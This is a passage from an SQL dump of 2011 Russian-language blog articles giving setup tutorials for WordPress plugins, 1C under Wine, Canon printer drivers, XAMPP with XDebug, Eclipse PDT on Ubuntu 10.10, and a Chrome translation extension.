Notepad++">Notepad++</a>)</li>\r\n	<li>Откроем нашу страницу в текстовом редакторе, и вставим в самом верху:</li>\r\n</ul>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/redir.jpg" style="width: 619px; height: 29px;" /></p>\r\n\r\n<ul>\r\n	<li>А внизу: <img alt="" class="img-responsive" src="/uploads/2011/01/redir2.jpg" style="width: 164px; height: 25px;" />&nbsp;Здесь два важных параметра: Если это страница какой нибудь CMS (например WordPress), а не обычная HTML, то&nbsp;придется&nbsp;немного поморочится с условиями if then else, и здесь уже без знаний РНР Вам не обойтись. Но нет ничего не возможного - спрашивайте в комментариях. Это все. Теперь можете обращаться к файлу на сервере и он автоматически Вас перенаправит на выбранный вами сайт.\r\n	<ul>\r\n		<li>Refresh 4 - вместо &quot;4&quot;&nbsp;подставьте&nbsp;свое значение. Это время в секундах, через которое пользователь будет перенаправлен на...</li>\r\n		<li>http://example.com - это сам сайт на который будет перенаправлен пользователь.</li>\r\n	</ul>\r\n	</li>\r\n</ul>', NULL, 1, NULL, '2011-01-06 01:15:51'),
(23, 'Подписка на комментарии', 'podpiska-na-kommientarii', '<p>Есть множество способов взаимодействия с посетителями сайта. К ним можно отнести комментарии, подписки, опросы, чаты, форумы и т.п. Так сегодня я хотел бы поговорить о подписке на комментарии. <!--more-->Нашел и установил на блог&nbsp;Subscribe To Comments v.2.1.2. Это плагин позволяет посетителям пожелавшим оставить свои комментарии к понравившемся им заметкам получать уведомления на&nbsp;электронную&nbsp;почту просто поставив галку под полем для комментария. Плагин предельно прост в установке и пользывании, впрочем как и большинство ему подобных.&nbsp;<a href="http://txfx.net/wordpress-plugins/subscribe-to-comments/">Скачанный&nbsp;плагин</a> разархивируем в папку на жестком диске и скопируем&nbsp;/wp-content/plugins нашего сайта. После заходим на вкладку Плагины административной панели сайта, находим и активируем его. В Инструменты-&gt;Подписки можем посмотреть всех наших подписчиков. А в Настройки-&gt;Подписка на комментарии не так много настроек, хотя все и без них отображается и работает нормально.</p>', NULL, 1, NULL, '2011-01-08 00:13:23'),
(24, 'Карта сайта Dagon Design Sitemap Generator', 'karta-saita-dagon-design-sitemap-generator', '<p>Продолжаем <strong>оптимизировать </strong>наш <strong>блог</strong> и на этот раз мы создадим <strong>карту сайта</strong>. <strong>Карта сайта для WordPress</strong> выполняет две основные задачи. Во-первых <strong>упрощает навигацию по сайту</strong>, особенно для тех кто впервые попал на Ваш блог, во-вторых <strong>улучшает индексацию сайта поисковиками.</strong> <!--more--> <strong>Я создал карту сайта на WordPress с помощью плагина&nbsp;Dagon Design Sitemap Generator</strong>. <a href="http://www.dagondesign.com/sitemap/">Качаем последнюю версию</a> на сайте разработчика, распаковуем архив на жестком диске и копируем по FTP в папку /wp-content/plugins/. Переходим на вкладку Настройки административной панели нашего блога, находим пункт <strong>DDSitemapGen</strong> выбираем первой же настройкой language - Russion&nbsp;сохраняем&nbsp;и перезагружаем страницу. Теперь можем настраивать на свой вкус :) Для того чтобы вывести карту на блог, создадим новую страницу через Страницы-&gt; Добавить новую, дадим ей название напр. &quot;<strong>Карта сайта</strong>&quot; в тело статьи вставим код: <code><!-- ddsitemapgen --></code> Все теперь переходим на наш сайт и смотрим на результат. Обо всех найденых недочетах и проблемах сообщайте в комментариях.</p>', NULL, 1, NULL, '2011-01-08 12:34:38');
INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(25, '1C 7.7 на Ubuntu 10.10', '1c-7-7-na-ubuntu-10-10', '<p>Нашел время установить последнюю версию <a href="http://ru.wikipedia.org/wiki/Ubuntu"><strong>Ubuntu</strong></a>, и т.к. было очень много хороших отзывов о доработанном <a href="http://ru.wikipedia.org/wiki/Wine"><strong>Wine</strong></a> (эмулятор программ для Windows) решился сразу одним махом установить <strong>Linux</strong> как основную и единственную систему. Установка еще более упростилась, возможно из-за того что я делал это уже не впервый раз :), все драйвера встали без проблем. Даже с <strong>WiFi роутером D-Link DIR-615</strong> не смотря на нарекания форумчан, моя Убунта подружилась без проблем. Так что после недолгого ожидания я получил полностью рабочую лошадку с совершенно свободной, а главное бесплатной, операционной системой. Но <strong>с Wine и 1C </strong>все оказалось не так просто... <!--more--> После установки<strong> Wine</strong> из репозитория <strong>Ubuntu</strong> устанавливаем <strong>1С.</strong> Установка прошла без проблем, но вот запускаться <strong>1С</strong> отказалась. Если у Вас та же история... Качаем необходимые библиотеки <a href="http://www.microsoft.com/downloads/en/details.aspx?FamilyID=08b1ac1b-7a11-43e8-b59d-0867f9bdda66&amp;displaylang=en">отсюда</a> и сохраняем сюда: <code>/home/Имя_пользователя/.wine/dosdevices/c:</code> Открываем терминал (Приложения-&gt;Стандартные-&gt;Терминал) и прописываем следующую комманду: <code>wine c:\\\\DCOM98.EXE /C /T:c:\\\\temp /Q</code> Таким образом мы разархивировали библиотеки необходимые для работы в папку: <code>/home/Имя_пользователя/.wine/dosdevices/c:/temp</code> Из этой папки нам понадобятся 4 библиотеки: ole32.dll, olepro32.dll, oleaut32.dll, rpcrt4.dll. Копируем в паку: <code>/home/spolischook/.wine/dosdevices/c:/windows/system32</code> Соглашаемся с заменой файлов. Запускаем <strong>конфигуратор Wine</strong> Приложения-&gt;Wine-&gt;Настройка Wine, или через терминал: <code>winecfg</code> Начинаем настройку:</p>\r\n\r\n<p><strong>ВАЖНО! </strong><em>exe файл <strong>1С</strong> находиться в папке c:/Program Files/1Cv77/BIN и может называться 1cv7.exe или 1cv7l.exe или 1cv7n.exe или 1cv7s.exe. В следующих примерах, когда я буду запускать 1С из командной строки, я буду использовать название 1cv7s.exe, т.к. в моем примере это именно так. Если у Вас другой файл, меняйте название на свое.</em></p>\r\n\r\n<p>Через вкладку Приложения добавляем в список исполняемый (exe) файл <strong>1С</strong> (в папке Program Files). Выделяем добавленный файл и переходим на вкладку Библиотеки. Добавляем библиотеки и настройки к ним:</p>\r\n\r\n<p><strong>ole32</strong> &mdash; &laquo;<em>сторонняя</em>&raquo;;</p>\r\n\r\n<p><strong>oleaut32 </strong>&mdash; &laquo;<em>сторонняя</em>&raquo;;</p>\r\n\r\n<p><strong>olepro32</strong> &mdash; &laquo;<em>сторонняя</em>&raquo;;</p>\r\n\r\n<p><strong>rpcrt4</strong> &mdash; &laquo;<em>сторонняя, встроенная</em>&raquo;;</p>\r\n\r\n<p>У меня еще потребовало библиотеку <strong>mfc42</strong>. Ее взял из Windows XP (пока есть место в облаке можно скачать у меня, <a href="http://ubuntuone.com/p/XQy/">жмите здесь</a>). Добавил по аналогии с предыдущими. Если все готово пробуем запустить через командную строку, так мы увидим ошибки если таковые будут: <code>wine &quot;c:\\\\Program Files\\\\1cv77\\\\Bin\\\\1cv7s.exe&quot;</code> Попробовали? Я натолкнулся на очередную ошибку, которая ругалась на ту самую <strong>mfc42</strong> библиотеку. Немного погуглив нашел решение. Для того чтобы установить нормальную библиотеку необходимо в терминале выполнить несколько команд: <code>wget http://www.kegel.com/wine/winetricks</code> и <code>sh winetricks mfc42</code> соглашаемся со всеми всплывающими окнами, через командную строку (можно просто кнопкой вверх найти последнюю команду) запускаем <strong>1С</strong>, и... О чудо! Она запустилась, даже без платного Wine от Езерсофт! ;) При первом запуске, <strong>1С</strong> выдаст ошибку &quot;Порядок сортировки, установленный для базы данных, отличается от системного!&quot;. Для поправки состояния заходим в конфигуратор <strong>1С</strong>, Администрирование-&gt;Кодовая страница таблиц ИБ выбираем &quot;+ текущая системная установка&quot;, далее идем в Окна-&gt;Панель окон-&gt;снимаем галочку с Показать - из-за этого параметра <strong>1С</strong> будет постоянно вылетать. У меня случалось что после изменения настройки показа окон в конфигураторе, в 1С ничего не менялось, поэтому после обычного входа в 1С проделываем туже операцию.</p>\r\n\r\n<p><strong>UPD:</strong> Вообще практическими пробами было обнаружено что иногда необходимо с<span>нять галочку&nbsp;&mdash; Настройки Wine -&gt; Графика -&gt; Разрешать менеджеру окон управлять окнами Wine но делать это нужно только в том случае если уже ничего не помогает т.к. работать в таком режиме крайне не удобно.</span> <a name="UPD2"></a></p>\r\n\r\n<p><strong>UPD2: Проблемы с русским вводом. </strong> После всего проделанного возможно будет отсутствовать русский ввод. Решаем проблему следующим образом - в Терминале:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo gedit /var/lib/locales/supported.d/ru</code></pre>\r\n\r\n<p>добавим в конец файла:</p>\r\n\r\n<pre>\r\n<code>ru_RU.CP1251 CP1251\r\nru_UA.CP1251 CP1251</code></pre>\r\n\r\n<p>Сохраняем, закрываем. В Терминале:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo locale-gen</code></pre>\r\n\r\n<p>Создаем новый текстовый документ и ложим туда следующий код:</p>\r\n\r\n<pre>\r\n<code>#!/bin/bash\r\nLC_ALL=ru_RU.CP1251 wine &quot;c:\\\\Program Files\\\\1cv77\\\\Bin\\\\1cv7s.exe&quot;</code></pre>\r\n\r\n<p>Сохраняем в домашнем каталоге под именем 1C Далее Приложения -&gt; Wine -&gt; Программы -&gt; 1С Предприятие -&gt; кликаем правой кнопкой на значке с программой -&gt; Добавить кнопку запуска на панель. После этого на панели быстрого запуска у нас появится кнопочка 1С-ки. Кликаем правой кнопочкой на ней -&gt; Свойства -&gt; Команда пишем следующее:</p>\r\n\r\n<pre>\r\n<code>sh /home/[Имя_Пользователя]/1C</code></pre>\r\n\r\n<p>Не забудте заменить [Имя_Пользователя] на свое. Жмем &quot;Закрыть&quot;. Все готово.</p>', NULL, 1, NULL, '2011-01-10 10:49:42'),
(26, 'Принтер Canon LBP на Ubuntu 10.10', 'printier-canon-lbp-na-ubuntu-10-10', '<p>Нашел в интернете полностью автоматическое решение для установки практически всех популярных лазерных принтеров <strong>Canon серии LBP</strong>. Интересно, что с принтерами HP никаких проблем нет, все драйвера под <strong>Linux</strong> идут достаточно качественные, а некоторые даже лучше чем <strong>Windows</strong>. То ли дело <strong>Canon</strong>. Честно говоря, кто хоть раз сталкивался с необходимостью установить &quot;японцев&quot; под <strong>Ubuntu</strong> не раз проклинал и производителя принтеров и саму Канониан, что складывается впечатление что драйвера пишут заядлые ненавистники <strong>Линукса</strong>. И вот совсем недавно добрый программист по имени Раду (<a href="http://radu.cotescu.com/" target="_blank">официальный сайт</a>) выложил самописный скрипт установки драйверов <!--more-->Если в кратце то инструкция такова:</p>\r\n\r\n<p>1. Скачать архив <a href="http://ubuntuone.com/p/Xgf/">отсюда</a> или <a href="http://codebin.cotescu.com/canon/lbp_driver/CanonCAPTdriver.tar.gz">отсюда</a></p>\r\n\r\n<p>2. Распаковать архив на жесткий диск</p>\r\n\r\n<p>3. Через терминал заходим в директорию (открыть папку, жми Ctrl+L, скопируй адрес, в терминале пишем cd &lt;адрес&gt;)</p>\r\n\r\n<p>4. Запускаем скрипт следующей коммандой:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo bash ./canonLBP_install.sh &lt;Имя_принтера&gt; </code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">&lt;Имя_принтера&gt; заменяем на модель из перечисленных ниже: Скрипт поддерживает следующие модели: </span></p>\r\n\r\n<p><strong style="line-height: 1.6em;">LBP-1120/810, LBP-1210, LBP2900, LBP3000, LBP3010, LBP3018, LBP3050, LBP3100, LBP3108, LBP3150, LBP3200, LBP3210, LBP3250, LBP3300, LBP3310, LBP3500, LBP5000, LBP5050, LBP5100, LBP5300, LBP7200C, LBP6300dn, LBP9100Cdn</strong><span style="line-height: 1.6em;"> </span></p>\r\n\r\n<p><span style="line-height: 1.6em;">Все устанавливается в автоматическом режиме. Красота, не правда ли :) Статья в оригинале, обсуждение и общение с автором </span><a href="http://radu.cotescu.com/how-to-install-canon-lbp-printers-in-ubuntu/" style="line-height: 1.6em;" target="_blank">здесь.</a><span style="line-height: 1.6em;"> </span></p>\r\n\r\n<p><strong style="line-height: 1.6em;">UPD: </strong><span style="line-height: 1.6em;">Понадобилось мне его еще расшарить по сети, и это оказалось проще-простого. Проверьте адрес </span><a href="http://localhost:631/" style="line-height: 1.6em;" target="_blank">http://localhost:631/</a><span style="line-height: 1.6em;"> Если все норм, то должна открыться панель управления CUPS. В Windows выбираем установка сетевого принтера и прописываем путь http://ip_линукс_машины:631/printers/имя_принтера У меня к примеру путь выглядит так: http://192.168.0.100:631/printers/LBP-1120 upd. Запуск ccpd</span></p>\r\n\r\n<pre>\r\n<code class="bash">sudo /etc/init.d/ccpd start</code></pre>', NULL, 1, NULL, '2011-01-10 22:35:22'),
(27, 'XAMPP + XDebug на Ubuntu 10.10', 'xampp-xdebug-na-ubuntu-10-10', '<p>Некоторое время пользовался <strong>LAMP</strong> и вроде как все устраивало, но после переустановки системы решил немного&nbsp;поэкспериментировать&nbsp;и установить <strong>XAMPP</strong> как более совершенный инструмент для разработки вэб приложений.</p>\r\n\r\n<h2><!--more-->Что это?</h2>\r\n\r\n<p><strong>XAMPP</strong> это крос-платформенный программный пакет для веб программирования.</p>\r\n\r\n<p><strong>XAMPP</strong> - это аббревиатура:</p>\r\n\r\n<p>X - кросс-платформенность (Windows, <strong>Linux</strong>, MacOs, Solaris)</p>\r\n\r\n<p>A - <strong>Apache</strong> (самый распространенный вэб сервер)</p>\r\n\r\n<p>M - <strong>MySQL</strong> (реляционная база данных)</p>\r\n\r\n<p>P - <strong>PHP</strong> (язык программирования)</p>\r\n\r\n<p>P - <strong>Perl </strong>(язык программирования)</p>\r\n\r\n<h2>Установка</h2>\r\n\r\n<p>На официальном сайте скачать последнюю версию <strong>XAMPP</strong> для <strong>Linux</strong>. <a href="http://www.apachefriends.org/en/xampp-linux.html" target="_blank">Качать здесь.</a> На момент написания статьи - <a href="http://www.apachefriends.org/download.php?xampp-linux-1.7.3a.tar.gz" target="_blank">XAMPP Linux 1.7.3a</a></p>\r\n\r\n<p><em><strong>О XAMPP и Skype</strong>: Apache и Skype используют 80-ый порт для входящих соединений. Если Вы желаете использовать их вместе идем в Настройки(Ctrl+O)-&gt;Дополнительные-&gt;Соединение и снимите галочку с &quot;Использовать 80 и 433 порт&quot;. Раньше у меня эта опция была, но сейчас Skype по умолчанию не использует эти порты, может только на Linux? Если у Вас их нет, так тому и быть :)</em></p>\r\n\r\n<p>На время установки уполномочим себя правами суперпользователя root:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo su</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Перейдем в каталог куда мы сохранили архив (менеджере файлов нжав Ctrl+L можно получить адресс):</span></p>\r\n\r\n<pre>\r\n<code class="bash">cd &lt;Путь_к_архиву&gt; </code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Распакуем архив в папку /opt (незабудьте что Имя_архива у Вас может отличаться):</span></p>\r\n\r\n<pre>\r\n<code class="bash">tar xvfz xampp-linux-1.7.3a.tar.gz -C /opt</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Фактически это все. </span><strong style="line-height: 1.6em;">XAMPP</strong><span style="line-height: 1.6em;"> установлен в директорию /opt/lampp Для запуска:</span></p>\r\n\r\n<pre>\r\n<code class="bash">/opt/lampp/lampp start</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Для проверки перейдите по адресу http://localhost </span></p>\r\n\r\n<p><strong style="line-height: 1.6em;">PHPMyAdmin</strong><span style="line-height: 1.6em;"> доступен по адресу http://localhost/phpmyadmin/ </span></p>\r\n\r\n<p><span style="line-height: 1.6em;">Далее не обязательный но очень желательный </span><strong style="line-height: 1.6em;">XDebug</strong></p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install php-pear php5-dev</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Соглашаемся со всем и далее:</span></p>\r\n\r\n<pre>\r\n<code class="bash">sudo pecl install xdebug</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">В конце должны получить:</span></p>\r\n\r\n<pre>\r\n<code>Build process completed successfully\r\nInstalling &#39;/usr/lib/php5/20090626+lfs/xdebug.so&#39;\r\ninstall ok: channel://pecl.php.net/xdebug-2.1.0\r\nconfiguration option &quot;php_ini&quot; is not set to php.ini location\r\nYou should add &quot;extension=xdebug.so&quot; to php.ini</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Здесь нам сообщают что процесс установки завершился успешно, но нужно еще сообщить об этом серверу через </span><strong style="line-height: 1.6em;">php.ini</strong><span style="line-height: 1.6em;">. </span></p>\r\n\r\n<p><span style="line-height: 1.6em;">Но сначала создадим временную папку для </span><strong style="line-height: 1.6em;">XDebuger</strong><span style="line-height: 1.6em;">:</span></p>\r\n\r\n<pre>\r\n<code>sudo mkdir /opt/lampp/tmp/xdebug\r\nsudo chmod a+rwx -R /opt/lampp/tmp/xdebug</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Открываем </span><strong style="line-height: 1.6em;">php.ini</strong><span style="line-height: 1.6em;"> командой:</span></p>\r\n\r\n<pre>\r\n<code>sudo gedit /opt/lampp/etc/php.ini</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">А теперь нужно прописать путь к </span><strong style="line-height: 1.6em;">XDebug</strong><span style="line-height: 1.6em;">, у меня это /usr/lib/php5/20090626+lfs но у Вас последняя директория может отличаться от моей, обязательно проверьте. В конец файла добавим следующий код:</span></p>\r\n\r\n<pre>\r\n<code class="ini">;xDebug Configuration starts \r\n  zend_extension=&quot;/usr/lib/php5/20090626+lfs/xdebug.so&quot;\r\n  xdebug.remote_enable=1\r\n  xdebug.profiler_output_dir = &quot;/opt/lampp/tmp/xdebug&quot; ;здесь директория для сохранения результатов профилировщика\r\n  xdebug.profiler_enable = On \r\n  xdebug.remote_enable=On\r\n  xdebug.remote_host=&quot;localhost&quot;\r\n  xdebug.remote_port=10000\r\n  xdebug.remote_handler=&quot;dbgp&quot;\r\n;xDebug Configuration ends</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Ок, все установили, все прописали, не забыли сохранить и закрыть </span><strong style="line-height: 1.6em;">php.ini</strong><span style="line-height: 1.6em;">, теперь как нам все проверить? Очень просто. Перезапускаем сервер:</span></p>\r\n\r\n<pre>\r\n<code>/opt/lampp/lampp restart</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Переходим по ссылке http://localhost/xampp/index.php Заходим во вкладку </span><strong style="line-height: 1.6em;">phpinfo()</strong><span style="line-height: 1.6em;"> и листаем вниз где находим информацию по </span><strong style="line-height: 1.6em;">XDebug</strong><span style="line-height: 1.6em;"> примерно вот такую:</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/xdebug.png" style="width: 884px; height: 506px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Обратите внимание на настройки, они должны быть такими же как на рисунке:</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/xdebug_settings.png" style="width: 524px; height: 134px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Дополнение1: Если после перезагрузки компьютера по адресу </span><strong style="line-height: 1.6em;">http://localhost/</strong><span style="line-height: 1.6em;"> выводиться следующее сообщение</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/itworks.png" style="width: 550px; height: 317px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">А при запуске из командной строки </span><strong style="line-height: 1.6em;">XAMPP</strong><span style="line-height: 1.6em;"> выдается ошибка, следует убрать из автозагрузки сервер </span><strong style="line-height: 1.6em;">Apache</strong><span style="line-height: 1.6em;">. Делается это следующим образом: Система-&gt;Параметры-&gt;Запускаемые приложения находим Apache и удаляем его. </span></p>\r\n\r\n<p><span style="line-height: 1.6em;">Дополнение 2: Для упрощения работы - чтобы каждый раз не запускать сервер с консоли, создадим кнопки на рабочем столе (как в Denwer). 1. В домашнем каталоге (Переход-&gt;Домашний каталог) создадим пустой файл, назовем его например </span><strong style="line-height: 1.6em;">XAMPP</strong><span style="line-height: 1.6em;">, в который добавим следующий код:</span></p>\r\n\r\n<pre>\r\n<code class="bash">#!/bin/bash\r\nfoo=`gksudo -u root -k -m &quot;введите пароль root&quot; /bin/echo &quot;А вы рут?&quot;`\r\nif [ &quot;$1&quot; = &quot;stop&quot; ]; then\r\nsudo /opt/lampp/./lampp stop\r\nfi\r\nif [ &quot;$1&quot; = &quot;restart&quot; ]; then\r\nsudo /opt/lampp/./lampp restart\r\nfi\r\nif [ &quot;$1&quot; = &quot;start&quot; ]; then\r\nsudo /opt/lampp/./lampp start\r\nfi</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Теперь перейдем на рабочий стол и создадим кнопку (клик, правой кнопкой -&gt; создать кнопку запуска), дадим ей имя Start, в поле команда впишем /home/&lt;Имя_пользователя&gt;/</span><strong style="line-height: 1.6em;">XAMPP</strong><span style="line-height: 1.6em;"> start жмем Ок. Все готово :) </span></p>\r\n\r\n<p><span style="line-height: 1.6em;">То же самое проделываем для Restart и Stop </span></p>\r\n\r\n<p><span style="line-height: 1.6em;">Вот так это выглядит у меня:</span></p>\r\n\r\n<p><span style="line-height: 1.6em;"><img alt="" class="img-responsive" src="/uploads/2011/01/button.png" style="width: 466px; height: 272px;" /></span></p>', '/uploads/2014/02/xampp-xdebug-na-ubuntu-10-10.png', 1, NULL, '2011-01-11 23:37:42'),
(28, 'Видео YouTube во всплывающем окне JCE MediaBox+Joomla! 1.5', 'vidieo-youtube-vo-vsplyvaiushchiem-oknie-jce-mediabox-joomla-1-5', '<p>Собственно сама <strong>задача:</strong> Улучшить юзабилити сайта, устранив лишние клики мышью при просмотре видео на сайте. <strong>Дано:</strong> сайт на <strong>Joomla! 1.5</strong> с установленным <strong>JCE Editor</strong> <strong>Решение:</strong> Если еще не установлен<strong> JCE Editor</strong> <a href="http://www.joomlacontenteditor.net/downloads/editor">качаем</a> с <a href="http://www.joomlacontenteditor.net/">официального сайта</a> и устанавливаем. Точно также поступаем с <strong><a href="http://www.joomlacontenteditor.net/downloads/mediabox/category/mediabox-2">MediaBox</a>.</strong><!--more-->Далее делаем картинку, я делаю снимок экрана видеоролика на YouTube. Например такую:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/cherry-2010.png" style="width: 300px; height: 183px;" /></p>\r\n\r\n<p>Вставляем ее в статью, выделяем картинку и делаем ее ссылкой вот так:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/2011-01-15-1.jpg" style="width: 400px; height: 312px;" /></p>\r\n\r\n<p>Далее указываем следующие параметры. <strong> Вкладка Link</strong>. <em>URL</em> - это ссылка на видео <strong>YouTube</strong>. Это просто заходим на видео и копируем адрес из адресной строки браузера. <em>Заголовок:</em> Указываем название и описание через двойное двоеточие, так: <code>&lt;Название_видео&gt;::&lt;Описание_видео&gt;</code> <strong> Вкладка Advanced.</strong> <em>Class List </em>- jcepopup.&nbsp;<em>Relationship page to target </em>- указываем параметры: <code> width[1024], height[768] </code> Ширину и высоту поменять на свои. Сохраняем статью, получаем видео во всплывающем окне. Enjoy and keep smiling</p>', '/uploads/2014/02/vidieo-youtube-vo-vsplyvaiushchiem-oknie-jce-mediabox-joomla-1-5.png', 1, NULL, '2011-01-15 23:06:57'),
(29, 'Eclipse PDT + Ubuntu 10.10. Часть 1', 'eclipse-pdt-ubuntu-10-10-chast-1', '<p>В принципе нет ничего сложного в том чтобы установить <strong>Eclipse</strong> из репозитория <strong>Ubuntu</strong>. Но в той версии нет самого главного инструмента PHP разработчика - <strong>PHP Development Tools (PDT)</strong>. Об установке <strong>PDT в Eclipse на Ubuntu 10.10 </strong>и пойдет речь в этой статье. <!--more-->Собственно устанавливаем сам <strong>Eclipse</strong> из репозитория (Приложения-&gt;Центр приложения <strong>Ubuntu</strong>), в строку поиска забиваем <strong>Eclipse</strong>, находим устанавливаем. При первом запуске нас попросят указать рабочую папку (Select workspace). Наши&nbsp;проекты&nbsp;будем сохранять в папке: <code>/opt/lampp/htdocs</code> Здесь мы создаем новую папку которую назовем напр.<strong> joomla_development</strong> и ее выбираем в качестве папки проекта. Ставим галочку Use this as a defoult дабы не возвращаться к выбору снова при запуске. Запустили? Закроем окно приветствия</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-start.png" style="width: 550px; height: 391px;" /></p>\r\n\r\n<p>и получим нормальный ;) вид <strong>Eclipse</strong></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse.jpg" style="width: 500px; height: 375px;" /></p>\r\n\r\n<p>Мы установили базовый функционал, но т.к. мы будем заниматься <strong>PHP</strong> разработкой нам нужно установить <strong>PDT (PHP Development Tools)</strong>. Сделам мы это так... Открываем <strong>Eclipse</strong> (если мы его закрыли) Help-&gt;Install New Software... Work with: <code>http://download.eclipse.org/releases/galileo/</code> Если дальше <strong>Eclipse</strong> вывалится в ошибку пробуем это: <code>http://download.eclipse.org/releases/helios</code> Находим Web, XML, and Java EE Development в нем подпункт <strong>PHP</strong><strong> Development Tools (PDT) SDK Feature</strong> ставим галочку и нажимаем Next</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse2.jpg" style="width: 500px; height: 375px;" /></p>\r\n\r\n<p>Далее нас попросят принять лицензионное соглашение - принимаем без доли сомнения (OpenSource как никак :)</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse3.jpg" style="width: 500px; height: 375px;" /></p>\r\n\r\n<p>Далее после длительной установки в меню Windows-Preferens, у нас появиться дополнительный пункт <strong>PHP</strong>.</p>\r\n\r\n<h2>Конфигурируем XDebug</h2>\r\n\r\n<p><em><strong>Инфо:</strong> Следующие действия не являются обязательными, а лишь дополнительными, т.к. <strong>Eclipse</strong> будет работать и без этого.</em></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-pref.jpg" style="width: 500px; height: 283px;" /></p>\r\n\r\n<p>Как видим на нужно внести изменения в <strong>PHP Debuger</strong>, и проверить галочку Break at First Line/ Жмем configure возле <strong>PHP Debuger</strong> и указываем выбранный порт в <strong>php.ini</strong> (<a href="http://kotoblog.pp.ua/ubuntu/xamppxdebug-na-ubuntu-1010.html">мы устанавливали XAMPP+XDEBUG ранее</a>) Если забыли порт, открываем php.ini следующей командой: <code>sudo gedit /opt/lampp/etc/php.ini</code> Порт указали в xdebug.remote_port, в моем случае это 10000</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-deb-pref.jpg" style="width: 500px; height: 562px;" /></p>\r\n\r\n<p>Также я дал <strong>Zend Debuger </strong>- у 10001 порт. В некоторых случаях мы можем получить ошибку: <code>A Runtime Error has occurred. Do you wish to Debug? Line: 1 Error: Syntax error</code> Для устранения необходимо опцию &quot;Output Capture Settings / Capture stdout&quot; переключить с &quot;copy&quot; на &quot;off&quot;. Дальше переходим на вкладку: <code>PHP-&gt; Debug-&gt;Workbench Options</code> Выбираем установки так как на рисунке ниже:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/eclipse-pref2.jpg" style="width: 500px; height: 274px;" /></p>\r\n\r\n<p>В принципе с этими настройками вполне можно экспериментировать для получения наилучших результатов. Keep smiling. :)</p>', '/uploads/2014/02/eclipse-pdt-ubuntu-10-10-chast-1.jpeg', 1, NULL, '2011-01-18 23:37:48'),
(30, 'Переводчик (словарь) в Google Chrome', 'pierievodchik-slovar-v-google-chrome', '<p>Для того чтобы нам было удобно читать и воспринимать тексты на английском языке нам как интсрумент хорошо было бы установить <strong>Google translate</strong> в наш<strong> </strong><a href="http://www.google.com/chrome/intl/ru/more/index.html" target="_blank"><strong>Google chrome</strong> браузер</a>. <!--more--></p>\r\n\r\n<blockquote><img alt="Lingualeo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbmK9-xeLX6MNoXU4d1N7zHsIxb-cp0Q7XlYhmr-dYU4t23iPG" style="float:left" />Также очень рекомендую <a href="http://lingualeo.ru/r/8d1hjg">http://lingualeo.ru/</a> - как лучший сервис по изучению английского языка а также их <a href="https://chrome.google.com/webstore/detail/lingualeo/nglbhlefjhcjockellmeclkcijildjhi?hl=ru">расширение для Google Chrome</a></blockquote>\r\n\r\n<p>Переходим по <a href="https://chrome.google.com/extensions/detail/mgijmajocgfcbeboacabfgobmjgjcoja" target="_blank">ссылке</a> и нажимаем кнопку установить!</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/google-translate.jpg" style="width: 500px; height: 238px;" /></p>\r\n\r\n<p>Теперь у нас появилась новая фича в правом верхнем углу экрана (маленькая книжечка):</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/google-translate1.jpg" style="width: 414px; height: 192px;" /></p>\r\n\r\n<p>Нажимаем на ключик рядом с книжечкой (настройки <strong>Google chrome</strong>) и переходим Инструменты-&gt;Расширения</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/google-translate2.jpg" style="width: 500px; height: 276px;" /></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/google-translate3.jpg" style="width: 499px; height: 227px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">В новой вкладке открылись наши расширения, где мы нажмем &quot;Настройки&quot;, и получаем следующее:</span></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/01/google-translate42.jpg" style="width: 500px; height: 309px;" /></p>\r\n\r\n<p><span style="line-height: 1.6em;">Здесь выбираем&nbsp;Dictionary language: Russion и жмем сохранить (Save) Все, теперь наш плагин работает. Можем проверять. Заходим на англоязычный сайт и нажимаем (двойной клик) на незнакомое нам слово.</span></p>\r\n\r\n<p><span style="line-height: 1.6em;"><img alt="" class="img-responsive" src="/uploads/2011/01/google-translate51.jpg" style="width: 500px; height: 247px;" /></span></p>', 